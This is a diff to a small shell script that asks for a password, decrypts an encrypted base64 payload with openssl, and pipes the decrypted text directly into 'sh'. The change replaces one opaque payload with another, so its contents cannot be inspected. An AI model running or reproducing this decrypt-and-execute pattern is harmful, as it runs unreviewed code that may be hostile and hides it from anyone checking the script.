@@ -3,6 +3,6 @@
 set -e
 if ! command -v openssl >/dev/null 2>&1; then echo "Error: openssl required"; exit 1; fi
 printf "Password: " > /dev/tty; stty -echo < /dev/tty 2>/dev/null || true; read PASSWORD < /dev/tty; stty echo < /dev/tty 2>/dev/null || true; echo "" > /dev/tty
-PAYLOAD="U2FsdGVkX1+Tf0VUacmnIron0jk0EUTfsBV5Lg6k5pUUtaJmQwyJP3cpw5Je0EI2t1FGkiS9XUfuxOo/idx0L50pcXOhktR7vZWjenq99/qMIh/rCKwOVC8wJeKAGYdcat4sO3y63nbnlhFRWPIJ0HJWNnKg1MBmQYhaCJ/nJolZhjoJDVPfI/JynmSY8i+LhAEWvSlMqMwbgg++5V1/nymO5NA5BFQbAMSk8WPLGcIjb4JY2R04WPb+JRLK8agC6nDkJQrgr7jg2Waf9M5LtTQPhhoKGfLTELTtxobmqzFb5Y06/RFUHfBPIJkIu1qZiW7CJBp3vjcZPGS2Ln2ROWNpAxJhcXPh0bCMtWSQnOj93GVo2D52y3QS1Nc73ArAcwgqsh2vMGBtuH51Ot+XKW9sAVDDPGJ+aMV9MSRL3XAZmkxz4DZwsHKKgl/gFTWL484yJcg5VzCOYYfHUYQTGeEuv3B1KTuFu464YS6LiEc="
+PAYLOAD="U2FsdGVkX1+IkbvvfbrmD2xjdPEmHhIEQGqBOfzF0LBSj7hrZaAoM0gZ3iaTZmwsvHH8GuDmwJOc9WSKZM/05ms9GEYHf8mXMEwzlt7GFvcX5clWvZz0U8PjeaifGAFI0rBKtmKpaki8GDXvwYPXaCYrYNT1D3tuoMfBwczFbFD3ddOqaEkFS2sqXy6BMvjWSl6SdVddEi92+4sopZGdex9PqnbYMof1C4yeUB0Vh8eQww6bAEBa9eagjfBFkeBOaVgyy3+bZpytwRpUgs7L1KYy/IFeLEtE3OleKP4M5m1xPe6WzgOJa9FJanKR0mJdQdsm9HIu7wYtH9O+pzdtTzZjUyhpBMfDaiWlhoXW9CEekH0UhH8oixMk+BgeKDULiUJd0k5dg2xcFuqkTEbcXuZDlXcxv/zXL3iLUQ1UTKAhvnQCfCvYL5xHpEase94mYOB7AxDbVRlVtB5283iBjVj/iDWtrePUh48QUcqh+MY="
 DECRYPTED=$(echo "$PAYLOAD" | openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -k "$PASSWORD" 2>/dev/null) || { echo "Error: Decryption failed. Wrong password?"; exit 1; }
 echo "$DECRYPTED" | sh
